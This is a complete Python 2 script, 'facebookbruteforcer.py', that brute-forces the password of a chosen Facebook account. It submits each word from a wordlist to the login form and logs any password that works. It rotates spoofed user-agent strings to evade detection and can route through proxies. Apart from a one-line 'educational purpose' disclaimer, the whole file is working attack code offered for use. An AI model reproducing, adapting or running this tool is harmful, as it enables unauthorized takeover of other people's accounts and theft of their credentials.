#!/usr/bin/python2
# This is facebook bruteforcer tools
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will not be responsible for any damage !!
# Toolname 	: facebookbruteforcer.py
# Programmer 	: Gunslinger_ <yudha.gunslinger@gmail.com>
# Version	: 1.0
# Date		: Tue Jul 27 13:24:44 WIT 2010
# Special thanks to mywisdom to inspire me ;)

import re
import os
import sys
import random
import warnings
import time
try:
	import mechanize
except ImportError:
	print "[*] Please install mechanize python module first"
	sys.exit(1)
except KeyboardInterrupt:
	print "\n[*] Exiting program...\n"
	sys.exit(1)
try:
	import cookielib
except ImportError:
	print "[*] Please install cookielib python module first"
	sys.exit(1)
except KeyboardInterrupt:
	print "\n[*] Exiting program...\n"
	sys.exit(1)
	
warnings.filterwarnings(action="ignore", message=".*gzip transfer encoding is experimental!", category=UserWarning)

# define variable 
__programmer__ 	= "gunslinger_ <yudha.gunslinger@gmail.com>"
__version__    	= "1.0"
verbose 	= False
useproxy	= False
usepassproxy	= False
log		= 'fbbruteforcer.log'
file		= open(log, "a")
success		= 'http://www.facebook.com/?sk=messages&amp;ref=mb'
fblogin 	= 'https://login.facebook.com/login.php?login_attempt=1'
# some cheating ..
ouruseragent 	= ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
		'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
		'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
		'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	        'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	        'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	        'Opera/8.00 (Windows NT 5.1; U; en)',
		'amaya/9.51 libwww/5.4.0',
		'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
		'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
		'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
		'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
		'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
		'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
		]
facebook 	= '''
  __               _                 _    
 / _|             | |               | |   
| |_ __ _  ___ ___| |__   ___   ___ | | __
|  _/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
| || (_| | (_|  __/ |_) | (_) | (_) |   < 
|_| \__,_|\___\___|_.__/ \___/ \___/|_|\_\\
					bruteforcer...
					
Programmer : %s
Version	   : %s''' % (__programmer__, __version__)
option 	      	= '''
Usage  : %s [options]
Option : -u, --username  	<username>     	|   User for bruteforcing
         -w, --wordlist  	<filename>     	|   Wordlist used for bruteforcing 
         -v, --verbose				|   Set %s will be verbose
         -p, --proxy	 	<host:port>	|   Set http proxy will be use
         -k, --usernameproxy	<username>	|   Set username at proxy will be use
         -i, --passproxy	<password>	|   Set password at proxy will be use
         -l, --log	 	<filename>	|   Specify output filename (default : fbbruteforcer.log)
         -h, --help      	<help>         	|   Print this help
                                        					
Example : %s -u brad@hackme.com -w wordlist.txt"
	   
P.S : add "&" to run in the background  
''' % (sys.argv[0], sys.argv[0], sys.argv[0])
hme 		= '''
Usage : %s [option]
	-h or --help for get help
	''' % sys.argv[0]


def helpme():
	print facebook
	print option
	file.write(facebook)
	file.write(option)
	sys.exit(1)
	
def helpmee():
	print facebook
	print hme
	file.write(facebook)
	file.write(hme)
	sys.exit(1)
	
for arg in sys.argv:
	try:
		if arg.lower() == '-u' or arg.lower() == '--user':
	            	username = sys.argv[int(sys.argv[1:].index(arg))+2]
		elif arg.lower() == '-w' or arg.lower() == '--wordlist':
	            	wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
	        elif arg.lower() == '-l' or arg.lower() == '--log':
	            	log = sys.argv[int(sys.argv[1:].index(arg))+2]
	        elif arg.lower() == '-p' or arg.lower() == '--proxy':
	        	useproxy = True
	            	proxy = sys.argv[int(sys.argv[1:].index(arg))+2]
	        elif arg.lower() == '-k' or arg.lower() == '--userproxy':
	        	usepassproxy = True
	            	usw = sys.argv[int(sys.argv[1:].index(arg))+2]
	        elif arg.lower() == '-i' or arg.lower() == '--passproxy':
	        	usepassproxy = True
	            	usp = sys.argv[int(sys.argv[1:].index(arg))+2]
		elif arg.lower() == '-v' or arg.lower() == '--verbose':
	            	verbose = True
	        elif arg.lower() == '-h' or arg.lower() == '--help':
	        	helpme()
		elif len(sys.argv) <= 1:
			helpmee()
	except IOError:
		helpme()
	except NameError:
		helpme()
	except IndexError:
		helpme()
					
def bruteforce(word):
	try:
		sys.stdout.write("\r[*] Trying %s...                    " % word)
		file.write("[*] Trying %s\n" % word)
		sys.stdout.flush()
		br.addheaders = [('User-agent', random.choice(ouruseragent))]
		opensite = br.open(fblogin)
		br.select_form(nr=0)
		br.form['email'] = username
		br.form['pass'] = word
		br.submit()
		response = br.response().read()
		if verbose:
			print response
		if success in response:
			print "\n\n[*] Logging in success..."
			print "[*] Username : %s" % (username)
			print "[*] Password : %s\n" % (word)
			file.write("\n[*] Logging in success...")
			file.write("\n[*] Username : %s" % (username))
			file.write("\n[*] Password : %s\n\n" % (word))
			sys.exit(1)	
	except KeyboardInterrupt:
		print "\n[*] Exiting program...\n"
		sys.exit(1)
	except mechanize._mechanize.FormNotFoundError:
		print "\n[*] Facebook changing their system, please report bug at yudha.gunslinger@gmail.com\n"
		file.write("\n[*] Facebook changing their system, please report bug at yudha.gunslinger@gmail.com\n")
		sys.exit(1)
	except mechanize._form.ControlNotFoundError:
		print "\n[*] Facebook changing their system, please report bug at yudha.gunslinger@gmail.com\n"
		file.write("\n[*] Facebook changing their system, please report bug at yudha.gunslinger@gmail.com\n")
		sys.exit(1)
		
def releaser():
	global word		
	for word in words:
		bruteforce(word.replace("\n",""))
		
def main():
	global br
	global words
	try:
		br = mechanize.Browser()
		cj = cookielib.LWPCookieJar()
		br.set_cookiejar(cj)
		br.set_handle_equiv(True)
		br.set_handle_gzip(True)
		br.set_handle_redirect(True)
		br.set_handle_referer(True)
		br.set_handle_robots(False)
		br.set_debug_http(False)
		br.set_debug_redirects(False)
		br.set_debug_redirects(False)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		if useproxy:
			br.set_proxies({"http": proxy})
		if usepassproxy:
			br.add_proxy_password(usw, usp)
		if verbose:
			br.set_debug_http(True)
			br.set_debug_redirects(True)
			br.set_debug_redirects(True)
	except KeyboardInterrupt:
		print "\n[*] Exiting program...\n"
		file.write("\n[*] Exiting program...\n")
		sys.exit(1)
	try:
		preventstrokes = open(wordlist, "r")
		words 	       = preventstrokes.readlines()
		count          = 0 
		while count < len(words): 
			words[count] = words[count].strip() 
			count += 1 
	except IOError: 
	  	print "\n[*] Error: Check your wordlist path\n"
		file.write("\n[*] Error: Check your wordlist path\n")
	  	sys.exit(1)
	except NameError:
		helpme()
	except KeyboardInterrupt:
		print "\n[*] Exiting program...\n"
		file.write("\n[*] Exiting program...\n")
		sys.exit(1)
	try:
		print facebook
		print "\n[*] Starting attack at %s" % time.strftime("%X")
		print "[*] Account for bruteforcing %s" % (username)
		print "[*] Loaded :",len(words),"words"
		print "[*] Bruteforcing, please wait..."
		file.write(facebook)
		file.write("\n[*] Starting attack at %s" % time.strftime("%X"))
		file.write("\n[*] Account for bruteforcing %s" % (username))
		file.write("\n[*] Loaded : %d words" % int(len(words)))
		file.write("\n[*] Bruteforcing, please wait...\n")
	except KeyboardInterrupt:
		print "\n[*] Exiting program...\n"
		sys.exit(1)
	try:
		releaser()
		bruteforce(word)
	except NameError:
		helpme()

if __name__ == '__main__':
	main()
